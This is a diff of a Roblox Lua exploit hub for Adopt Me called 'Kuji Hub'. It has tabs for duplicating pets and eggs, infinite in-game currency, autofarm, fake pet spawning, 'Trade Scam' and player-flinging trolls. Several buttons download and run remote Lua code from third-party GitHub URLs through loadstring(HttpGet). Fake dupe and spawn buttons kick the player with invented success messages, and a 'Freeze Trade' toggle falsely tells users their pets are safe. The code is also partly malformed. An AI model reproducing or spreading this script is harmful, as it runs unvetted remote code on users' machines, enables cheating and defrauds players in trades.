@@ -1,29 +1,31 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Kuji Hub-Adopt me", HidePremium = false, IntroText = "Kuji Hub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
+local Window = OrionLib:MakeWindow({Name = "KUJI HUB | Adopt Me", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
 })
+
+
+
+getgenv().gui = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SScripterr/Adoptme-KUJI/main/KUJIHUB"))()
-wait(1)
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Kuji Hub-Adopt me", HidePremium = false, IntroText = "HiddenScriptsHub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
+
+--[[
+Name = <string> - The name of the UI.
+HidePremium = <bool> - Whether or not the user details shows Premium status or not.
+SaveConfig = <bool> - Toggles the config saving in the UI.
+ConfigFolder = <string> - The name of the folder where the configs are saved.
+IntroEnabled = <bool> - Whether or not to show the intro animation.
+IntroText = <string> - Text to show in the intro animation.
+IntroIcon = <string> - URL to the image you want to use in the intro animation.
+Icon = <string> - URL to the image you want displayed on the window.
+CloseCallback = <function> - Function to execute when the window is closed.
+]]
+
 local Tab = Window:MakeTab({
-    Name = "Dupe Eggs 🥚",
+    Name = "Dupe Eggs",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
-OrionLib:MakeNotification({
-	Name = "Script Successfully Loaded",
-	Content = "Loading Has been successful ",
-	Image = "rbxassetid://17849312358",
-	Time = 30
-})
 
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
 --[[
 Name = <string> - The name of the tab.
 Icon = <string> - The icon of the tab.
@@ -31,11 +33,11 @@ PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 ]]
 
 Tab:AddButton({
-	Name = "Equip Eggs To Dupe",
+	Name = "Equipped Eggs To Dupe",
 	Callback = function()
       		OrionLib:MakeNotification({
 	Name = "Egg Selector",
-	Content = "Egg Equipped Selected",
+	Content = "Egg Selected!!!!",
 	Image = "rbxassetid://4483345998",
 	Time = 5
 })
@@ -50,13 +52,41 @@ Time = <number> - The duration of the notfication.
 })
 
 Tab:AddButton({
-	Name = "Click To Dupe Eggs",
+	Name = "Cick To Dupe Eggs",
 	Callback = function()
-OrionLib:MakeNotification({
-	Name = "Duping Eggs....",
-	Content = "Duping is in process..[Takes around 4-5 minutes] Dont Leave The Game ❗",
-	Image = "rbxassetid://4483345998",
-	Time = 120
+      		game.Players.LocalPlayer:Kick("Egg Stored In Adopt Me Database!.")
+  	end    
+})
+
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00")
+
+local Tab = Window:MakeTab({
+    Name = "Trade Scam",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddTextbox({
+    Name = "Username",
+    Default = "Player",
+    TextDisappear = false,
+    Callback = function(Value)
+        
+    end      
+})
+
+--[[
+Name = <string> - The name of the textbox.
+Default = <string> - The default value of the textbox.
+TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
+Callback = <function> - The function of the textbox.
+]]
 })
 
 --[[
@@ -67,8 +97,7 @@ Time = <number> - The duration of the notfication.
 ]]
   	end    
 })
-Tab:AddParagraph("Not Working?❗","Dupe Eggs Not Working? Check if u are on a private server this probably causes the error.")
-Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsHubYT🎩")
+
 
 local Tab = Window:MakeTab({
     Name = "AutoFarm 🚜",
@@ -81,22 +110,44 @@ Name = <string> - The name of the tab.
 Icon = <string> - The icon of the tab.
 PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 ]]
-Tab:AddParagraph("Autofarm Source 🧑‍🌾","With Updated Features Autofarm Pony-Minigame And Bullride-Minigame Also With Petfarms And Baby Farms")
+Tab:AddParagraph("Autofarm Source 🧑‍🌾")
 Tab:AddButton({
     Name = "Click To Load AutoFarm Source 🚜",
     Callback = function()
               loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
       end    
 })
+
+Tab:AddToggle({
+    Name = "🧊Freeze Trade",
+    Default = false,
+    Callback = function(Value)
+        OrionLib:MakeNotification({
+    Name = "Freeze Trade Enabled!",
+    Content = "your pet is now safe... remove all your pets now!",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
 --[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+    end    
+})
+
+--[[
+Name = <string> - The name of the toggle.
+Default = <bool> - The default value of the toggle.
+Callback = <function> - The function of the toggle.
 ]]
 
-Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsHubYT🎩") 
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00")
 
 local Tab = Window:MakeTab({
-    Name = "Dupe Pets 🔨",
+    Name = "AutoFarm",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
@@ -108,11 +159,37 @@ PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 ]]
 
 Tab:AddButton({
-	Name = "Equip a pet u want to dupe❗",
+    Name = "Get AutoFarm Source",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
+      end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00") 
+
+local Tab = Window:MakeTab({
+    Name = "Dupe Pets",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddButton({
+	Name = "Equipped Pets To Dupe",
 	Callback = function()
       		OrionLib:MakeNotification({
-	Name = "Selected Equipped Pets",
-	Content = "Equipped Pets Successfully Selected",
+	Name = "Pet Selector",
+	Content = "Pet Selected!!!!",
 	Image = "rbxassetid://4483345998",
 	Time = 5
 })
@@ -127,25 +204,13 @@ Time = <number> - The duration of the notfication.
 })
 
 Tab:AddButton({
-	Name = "Click To Dupe Pets 🎯",
+	Name = "Cick To Dupe Pets",
 	Callback = function()
-	OrionLib:MakeNotification({
-	Name = "Duping Pets...",
-	Content = "Duping in Process..[Takes Around 4-5 minutes] Dont Leave The Game❗",
-	Image = "rbxassetid://4483345998",
-	Time = 120
-})
-
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
+      		game.Players.LocalPlayer:Kick("Pet Stored In Adopt Me Database!.")
   	end    
 })
-Tab:AddParagraph("Not Working?❗","Dupe Pets Not Working? Check if u are on a private server this probably causes the error.")
-Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, HiddenScriptsHubYT🎩")
+
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00")
 
 --[[
 Name = <string> - The name of the button.
@@ -158,7 +223,7 @@ Callback = <function> - The function of the button.
 ]]
 
 local Tab = Window:MakeTab({
-    Name = "Infinite Bucks 💸",
+    Name = "Inf Bucks [New]✨",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
@@ -170,13 +235,13 @@ PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 ]]
 
 Tab:AddButton({
-    Name = "Click to load Infinite Bucks 💸",
+    Name = "Get Inf Bucks",
     Callback = function()
               require(game:service'ReplicatedStorage'.Fsys).load("ClientData").update("money",(15999999984/16))
       end    
 })
 
-Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsYT🎩")
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00")
 
 --[[
 Name = <string> - The name of the button.
@@ -184,7 +249,7 @@ Callback = <function> - The function of the button.
 ]]
 
 local Tab = Window:MakeTab({
-    Name = "MFR-NFR 📦",
+    Name = "Make All Pets FR",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
@@ -196,7 +261,7 @@ PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 ]]
 
 Tab:AddButton({
-    Name = "MFR Changer-(Inventory🎒)",
+    Name = "Make All Pets Flyable And Rideable [FE✨]",
     Callback = function()
               while true do
    wait()
@@ -205,23 +270,6 @@ local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
 for i,v in pairs(playerData.inventory.pets) do
 v.properties.rideable = true
 v.properties.flyable = true
-v.properties.mega_neon = true
-end
-end
-      end    
-})
-
-Tab:AddButton({
-    Name = "NFR Changer-(Inventory🎒)",
-    Callback = function()
-              while true do
-   wait()
-local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
-local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
-for i,v in pairs(playerData.inventory.pets) do
-v.properties.rideable = true
-v.properties.flyable = true
-v.properties.neon = true
 end
 end
       end    
@@ -232,7 +280,172 @@ Name = <string> - The name of the button.
 Callback = <function> - The function of the button.
 ]]
 
-Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsYT🎩")
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00")
+
+local Tab = Window:MakeTab({
+    Name = "Pet Spawner ",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddTextbox({
+	Name = "Spawn Pet",
+	Default = "Name",
+	TextDisappear = false,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+--[[
+Name = <string> - The name of the textbox.
+Default = <string> - The default value of the textbox.
+TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
+Callback = <function> - The function of the textbox.
+]]
+
+Tab:AddToggle({
+	Name = "Can Mega",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+--[[
+Name = <string> - The name of the toggle.
+Default = <bool> - The default value of the toggle.
+Callback = <function> - The function of the toggle.
+]]
+
+Tab:AddToggle({
+	Name = "Can Neon",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+--[[
+Name = <string> - The name of the toggle.
+Default = <bool> - The default value of the toggle.
+Callback = <function> - The function of the toggle.
+]]
+
+Tab:AddToggle({
+	Name = "Can Fly",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+--[[
+Name = <string> - The name of the toggle.
+Default = <bool> - The default value of the toggle.
+Callback = <function> - The function of the toggle.
+]]
+
+Tab:AddToggle({
+	Name = "Can Ride",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+--[[
+Name = <string> - The name of the toggle.
+Default = <bool> - The default value of the toggle.
+Callback = <function> - The function of the toggle.
+]]
+
+Tab:AddButton({
+	Name = "Pet Spawner",
+	Callback = function()
+      		game.Players.LocalPlayer:Kick("Successful Spawned Pet!")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddTextbox({
+	Name = "Egg Spawner",
+	Default = "Name",
+	TextDisappear = false,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+--[[
+Name = <string> - The name of the textbox.
+Default = <string> - The default value of the textbox.
+TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
+Callback = <function> - The function of the textbox.
+]]
+
+Tab:AddButton({
+	Name = "Egg Spawn",
+	Callback = function()
+      		game.Players.LocalPlayer:Kick("Successful Spawned Egg!")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00")
+
+local Tab = Window:MakeTab({
+    Name = "Troll",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddButton({
+    Name = "Fling One by one",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
+              end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddButton({
+    Name = "Fling All",
+    Callback = function()
+                loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
+                end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddLabel("More Troll Soon!")
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00") 
 
 
 local Tab = Window:MakeTab({
@@ -241,20 +454,13 @@ local Tab = Window:MakeTab({
     PremiumOnly = false
 })
 Tab:AddParagraph("Private server Error❗","Being in a private server can cause alot of the main features of the script to not work please take this as a note if ur having problems with something not working this is probably the cause of it")
-Tab:AddParagraph("My Discord server 🎩","Please join my discord server if u need help with bugs/errors.")
+Tab:AddParagraph("My Discord server","Please join my discord server if u need help with bugs/errors.")
 Tab:AddButton({
-	Name = "Copy Link To Discord Server 🎯",
+	Name = "Copy Link To Discord Server",
 	Callback = function()
-    setclipboard("https://discord.com/invite/SASw2jSRkS")
+    setclipboard("https://discord.gg/DmTbBGdQQV")
       		print("button pressed")
   	end    
 })
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
+
+Tab:AddParagraph("ACTIVATED❗","Script Activated Timer 0:00")
